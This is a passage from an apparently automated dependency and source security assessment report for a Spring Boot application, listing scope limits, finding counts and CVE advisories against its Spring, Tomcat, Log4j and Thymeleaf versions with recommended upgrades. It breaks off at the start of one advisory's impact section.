# Security Assessment Report

**Generated:** 2026-10-26T19:18:46.509832Z

## Scope and limitations

CVE minimum severity: **medium**. The dependency scan covers all 104 resolved Maven dependencies, including direct, transitive, runtime, and test dependencies. Advisory matches do not establish application exploitability. CWE analysis covers all 59 requested rules.

- Static source/configuration assessment, not a penetration test; no Oracle runtime, load, or concurrency stress testing. Browser MCP transport was unavailable for dynamic DOM confirmation.
- CVE findings are exact resolved dependency/version advisory matches, not confirmation that all exploit prerequisites are enabled; test-only dependencies are explicitly labeled.
- Maven dependency tree covers all scopes under the current/default profile, not build-tool/plugin or container OS/JDK/Oracle image advisories. Bootstrap CDN 5.3.0 was separately queried and had no reported advisories.
- GitHub CLI had no authentication token; unauthenticated GitHub REST queries succeeded for all four batches with pagination, and no batch was silently treated as clean.
- Deployment-supplied SQL injection requires control over startup environment values; DOM XSS requires selection/drop or upload of a specially named file. External ingress/audit controls are not represented in the repository.
- NOT_FOUND means no confirmed matching source vulnerability under investigated conditions, not a guarantee of absence. Unknown-format uploads are accepted but no dangerous automatic handling or active-content response was demonstrated.

## Summary

| Metric | Count |
|---|---|
| TotalFindings | 79 |
| CveCount | 74 |
| CweCount | 5 |
| TotalRulesAssessed | 59 |
| RulesPassed | 54 |

### By Severity

| Severity | Count |
|---|---|
| mandatory | 43 |
| optional | 33 |
| potential | 3 |

## CVE Findings (Dependency Vulnerabilities)

### CVE-2026-47890: Spring Framework Server Sent Event stream corruption while rendering fragments
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-47890](https://github.com/advisories/GHSA-j9f9-w8pj-32f8): Spring Framework Server Sent Event stream corruption while rendering fragments

Severity: CRITICAL

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.19

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version supplied for this affected release range; move to a supported fixed release line following advisory guidance

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring MVC and WebFlux applications are vulnerable to stream corruption when using Server-Sent Events (SSE) with view fragments.
Spring Framework 7.0.0 - 7.0.8
Spring Framework 6.2.0 - 6.2.19

### CVE-2026-47884: Spring Framework Improper Path Limitation in XsltView
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-47884](https://github.com/advisories/GHSA-pc63-qcmh-9cmg): Spring Framework Improper Path Limitation in XsltView

Severity: CRITICAL

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.19

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version supplied for this affected release range; move to a supported fixed release line following advisory guidance

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Use of XsltView in a Spring MVC application can result in SSRF and RCE attack if the application has an "/**" mapping that results in view rendering, and where the view name is not explicitly specified.
Spring Framework 7.0.0 - 7.0.8
Spring Framework 6.2.0 - 6.2.19
Spring Framework 6.1.0 - 6.1.28
Spring Framework 6.0.0 - 6.0.30
Spring Framework 5.3.0 - 5.3.49
Spring Framework 5.2.25.RELEASE and earlier

### CVE-2026-65905: Apache Tomcat's DIGEST authenticator has an Authentication Bypass by Capture-replay vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-65905](https://github.com/advisories/GHSA-9xv2-5v5q-p794): Apache Tomcat's DIGEST authenticator has an Authentication Bypass by Capture-replay vulnerability

Severity: CRITICAL

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.58

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.58 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Authentication Bypass by Capture-replay vulnerability in Apache Tomcat's DIGEST authenticator. If, before windowSize requests have been made, a client makes a DIGEST authenticated request with a nonceCount on the upper boundary of the replay window then that request is replayable once only while the associated nonceCount remains within the replay window.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120.

The following versions were EOL at the time the CVE was created but are known to be affected: from 8.5.0 through 8.5.100, from 7.0.30 through 7.0.109. Other unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.25, 10.1.58 or 9.0.121, which fix the issue.

### CVE-2026-65182: Apache Tomcat has an Improper Access Control, Incorrect Authorization vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-65182](https://github.com/advisories/GHSA-gcx9-497g-6cp6): Apache Tomcat has an Improper Access Control, Incorrect Authorization vulnerability

Severity: CRITICAL

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.58

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.58 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Improper Access Control, Incorrect Authorization vulnerability in Apache Tomcat leads to security constraint bypass if a constraint for a longer path is specified before a more restrictive constraint for a shorter sub-path.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.

Users are recommended to upgrade to version 11.0.25, 10.1.58, 9.0.121, which fixes the issue.

### CVE-2026-68525: Apache Tomcat's FORM authentication process has an Incorrect Authorization vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-68525](https://github.com/advisories/GHSA-h3x4-894j-xpx5): Apache Tomcat's FORM authentication process has an Incorrect Authorization vulnerability

Severity: CRITICAL

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.58

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.58 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Incorrect Authorization vulnerability in Apache Tomcat's FORM authentication process allows the bypassing of a security constraint that limits user has access to a resource POST but not GET.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120.

The following versions were EOL at the time the CVE was created but are known to be affected: from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109. Other unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.25, 10.1.58 or 9.0.121, which fixes the issue.

### CVE-2026-49844: Apache Log4j API: Improper encoding of non-finite floating-point values during MapMessage JSON serialization
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-49844](https://github.com/advisories/GHSA-qv9r-c865-cp47): Apache Log4j API: Improper encoding of non-finite floating-point values during MapMessage JSON serialization

Severity: MEDIUM

Affected resolved dependencies:
  - org.apache.logging.log4j:log4j-api:2.24.3 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 2.13.1, < 2.25.5

Recommended fix:
  - org.apache.logging.log4j:log4j-api: upgrade to 2.25.5 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Improper encoding of non-finite floating-point values during MapMessage JSON serialization in Apache Log4j API produces output that is not valid JSON. This issue affects Apache Log4j API versions 2.13.1 through 2.25.4 and version 2.26.0.

The fix for CVE-2026-34481 did not cover all code paths: when a MapMessage contains a non-finite IEEE 754 value (NaN, Infinity, or -Infinity), MapMessage.asJson() emits the corresponding bare token. RFC 8259 does not permit these tokens, so a conformant parser rejects the resulting document.

The defect is reachable only when both of the following conditions hold:

  *  The application uses the  message resolver https://logging.apache.org/log4j/2.x/manual/json-template-layout.html#event-template-resolver-message  of JsonTemplateLayout or any other layout that relies on MapMessage.asJson() or MapMessage.getFormattedMessage(new String[]{"JSON"}).
  *  The application logs a MapMessage that contains an attacker-controlled floating-point value.


An attacker who can supply a non-finite value can cause the affected layout to emit malformed JSON, which may corrupt the enclosing log record or disrupt downstream log ingestion and parsing.

Users are advised to upgrade to Apache Log4j API 2.25.5 or 2.26.1, both of which emit RFC 8259-compliant JSON for non-finite values.

### CVE-2026-41854: Spring Framework Server-Side Request Forgery via UriComponentsBuilder
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41854](https://github.com/advisories/GHSA-7m2p-62gw-p8qq): Spring Framework Server-Side Request Forgery via UriComponentsBuilder

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-web:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-web: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Due to incorrect host parsing, applications that rely on UriComponentsBuilder to parse and validate an externally provided URL string may be exposed to a server-side request forgery (SSRF) attack.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18.

### CVE-2026-41853: Spring Framework Multipart Request Smuggling in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41853](https://github.com/advisories/GHSA-cjpg-rgq5-fr37): Spring Framework Multipart Request Smuggling in Spring MVC and WebFlux

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring MVC and WebFlux applications are vulnerable to Multipart request smuggling attacks.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41851: Spring Framework Denial of Service via Unbounded Cache in SpEL
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41851](https://github.com/advisories/GHSA-wxpp-56q6-5pcg): Spring Framework Denial of Service via Unbounded Cache in SpEL

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-expression:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-expression: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Applications which accept user-supplied Spring Expression Language (SpEL) expressions may be vulnerable to a Denial of Service (DoS) attack if the evaluation of a SpEL expression triggers unbounded cache growth.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41850: Spring Framework Algorithmic Denial of Service via SpEL Expressions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41850](https://github.com/advisories/GHSA-r5w3-xv2f-j59q): Spring Framework Algorithmic Denial of Service via SpEL Expressions

Severity: HIGH

Affected resolved dependencies:
  - org.springframework:spring-expression:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-expression: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Applications that evaluate user-supplied Spring Expression Language (SpEL) expressions are vulnerable to an Algorithmic Denial of Service (DoS). By providing a specially crafted expression, an attacker can trigger excessive resource consumption during evaluation, leading to application degradation or unavailability.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41846: Spring Framework Cross-site Scripting via JSP Form Tags
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41846](https://github.com/advisories/GHSA-957g-f97v-vppc): Spring Framework Cross-site Scripting via JSP Form Tags

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring MVC applications which accept user-supplied values in the cssClass, cssErrorClass, or cssStyle attributes of JSP form tags allow arbitrary HTML/JavaScript code injection, potentially resulting in a cross-site scripting (XSS) vulnerability.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41843: Spring Framework Path Traversal via Versioned Static Resources in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41843](https://github.com/advisories/GHSA-72pg-x5f8-j25j): Spring Framework Path Traversal via Versioned Static Resources in Spring MVC and WebFlux

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring MVC and WebFlux applications are vulnerable to Path Traversal attacks when resolving static resources.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41844: Spring Framework Open Redirect in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41844](https://github.com/advisories/GHSA-h3qp-gqrc-q736): Spring Framework Open Redirect in Spring MVC and WebFlux

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
A Spring MVC or Spring WebFlux application which configures a mapping for "/**" where the view name is not explicitly specified allows an attacker to craft a link resulting in a 302 redirect to an arbitrary external host via the redirect: prefix.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41845: Spring Framework Cross-site Scripting via JavaScriptUtils
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41845](https://github.com/advisories/GHSA-3chg-m5w7-qfv5): Spring Framework Cross-site Scripting via JavaScriptUtils

Severity: HIGH

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Due to incorrect escaping, the use of JavaScriptUtils.javaScriptEscape() may lead to JavaScript code injection in the browser, potentially resulting in a cross-site scripting (XSS) vulnerability.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41841: Spring Framework Information Disclosure via Static Resource Cache in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41841](https://github.com/advisories/GHSA-mq64-j8f9-9gcj): Spring Framework Information Disclosure via Static Resource Cache in Spring MVC and WebFlux

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring MVC and WebFlux applications are vulnerable to Information Disclosure attacks when resolving static resources.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41842: Spring Framework Denial of Service via Versioned Resources in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41842](https://github.com/advisories/GHSA-x23c-287f-qqv5): Spring Framework Denial of Service via Versioned Resources in Spring MVC and WebFlux

Severity: HIGH

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.18

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring MVC and WebFlux applications are vulnerable to Denial of Service (DoS) attacks when resolving static resources.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

### CVE-2026-41284: Apache Tomcat: Unbounded read in WebDAV LOCK and  PROPFIND handling
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41284](https://github.com/advisories/GHSA-gx5v-xp9w-j4cg): Apache Tomcat: Unbounded read in WebDAV LOCK and  PROPFIND handling

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.55

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
No limit was enforced on the request body for WebDAV LOCK or PROPFIND
requests which were available to unauthenticated users.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by Dariusz Gońda

### CVE-2026-43512: Apache Tomcat - Digest authenticator will authenticate any unknown user
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-43512](https://github.com/advisories/GHSA-h6fc-48rj-7qqh): Apache Tomcat - Digest authenticator will authenticate any unknown user

Severity: CRITICAL

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.55

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
When DIGEST authentication was configured, any user not known to the
configured Realm would be authenticated if they presented the password
"null".

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

### CVE-2026-43513: Apache Tomcat: LockOutRealm treats user names as case-sensitive
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-43513](https://github.com/advisories/GHSA-5mp6-jrq3-r938): Apache Tomcat: LockOutRealm treats user names as case-sensitive

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.55

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Improper Handling of Case Sensitivity vulnerability in LockOutRealm in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.
Older unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.22, 10.1.55 or 9.0.118 which fix the issue.

### CVE-2026-43515: Apache Tomcat - Security constraints not correctly applied
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-43515](https://github.com/advisories/GHSA-5m62-pw8w-7w9f): Apache Tomcat - Security constraints not correctly applied

Severity: CRITICAL

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.55

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
When multiple security constraints defined an HTTP method constraint for
the same extension pattern, only the first method constraint was applied.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

### CVE-2026-41293: Apache Tomcat - HTTP/2 request headers not validated
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41293](https://github.com/advisories/GHSA-r29c-68gh-xp6x): Apache Tomcat - HTTP/2 request headers not validated

Severity: CRITICAL

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.55

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
HTTP/2 request headers were not validated which may have triggered
unexpected application behaviour if the application (quite reasonably)
assumed that header value exposed through the Servlet API would be
specification compliant.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by Dawit Jeong (@dawitngoliath)

### CVE-2026-42498: Apache Tomcat - WebSocket authentication header exposure
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-42498](https://github.com/advisories/GHSA-fv25-8xcx-gqjc): Apache Tomcat - WebSocket authentication header exposure

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.55

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.2 to 9.0.117
Older, unsupported versions may also be affected

Description:
If a WebSocket request was redirected after authentication, Tomcat's
WebSocket client would present the most recent authentication header to
the redirect target host.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by lokerxx

### CVE-2026-41901: Sandboxed Thymeleaf expressions vulnerable to improper recognition of unauthorized syntax patterns
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:40

[CVE-2026-41901](https://github.com/advisories/GHSA-c9ph-gxww-7744): Sandboxed Thymeleaf expressions vulnerable to improper recognition of unauthorized syntax patterns

Severity: CRITICAL

Affected resolved dependencies:
  - org.thymeleaf:thymeleaf:3.1.3.RELEASE (compile; via spring-boot-starter-thymeleaf at pom.xml:40); affected range <= 3.1.4.RELEASE
  - org.thymeleaf:thymeleaf-spring6:3.1.3.RELEASE (compile; via spring-boot-starter-thymeleaf at pom.xml:40); affected range <= 3.1.4.RELEASE

Recommended fix:
  - org.thymeleaf:thymeleaf: upgrade to 3.1.5.RELEASE or later in a supported release line
  - org.thymeleaf:thymeleaf-spring6: upgrade to 3.1.5.RELEASE or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Impact

A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.4.RELEASE. Although the library provides mechanisms to avoid the execution of potentially dangerous expressions in some specific sandboxed (restricted) contexts, it fails to properly neutralize specific constructs that allow this kind of expressions to be executed. If an application developer passes to the template engine unsanitized variables that contain such expressions, and these values are used in sandboxed contexts inside the templates, these expressions can be executed achieving Server-Side Template Injection (SSTI).

### Patches

This has been fixed in Thymeleaf 3.1.5.RELEASE. All users are advised to upgrade immediately.

### Workarounds

No workaround is available beyond ensuring applications do not pass unvalidated/unsanitized data directly to the template engine. Upgrading to 3.1.5.RELEASE is strongly recommended in any case.

### CVE-2026-22745: Spring MVC and WebFlux applications are vulnerable to Denial of Service attacks when resolving static resources
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-22745](https://github.com/advisories/GHSA-6p4f-wcwh-5vvm): Spring MVC and WebFlux applications are vulnerable to Denial of Service attacks when resolving static resources

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, <= 6.2.17

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.18 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring MVC and WebFlux applications are vulnerable to Denial of Service attacks when resolving static resources.


More precisely, an application can be vulnerable when all the following are true:

  *  the application is using Spring MVC or Spring WebFlux
  *  the application is serving static resources from the file system
  *  the application is running on a Windows platform


When all the conditions above are met, the attacker can send malicious requests that are slow to resolve and that can keep HTTP connections in use. This can cause a Denial of Service on the application.

### CVE-2026-40478: Improper neutralization of specific syntax patterns for unauthorized expressions in Thymeleaf
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:40

[CVE-2026-40478](https://github.com/advisories/GHSA-xjw8-8c5c-9r79): Improper neutralization of specific syntax patterns for unauthorized expressions in Thymeleaf

Severity: CRITICAL

Affected resolved dependencies:
  - org.thymeleaf:thymeleaf:3.1.3.RELEASE (compile; via spring-boot-starter-thymeleaf at pom.xml:40); affected range <= 3.1.3.RELEASE
  - org.thymeleaf:thymeleaf-spring6:3.1.3.RELEASE (compile; via spring-boot-starter-thymeleaf at pom.xml:40); affected range <= 3.1.3.RELEASE

Recommended fix:
  - org.thymeleaf:thymeleaf: upgrade to 3.1.4.RELEASE or later in a supported release line
  - org.thymeleaf:thymeleaf-spring6: upgrade to 3.1.4.RELEASE or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Impact
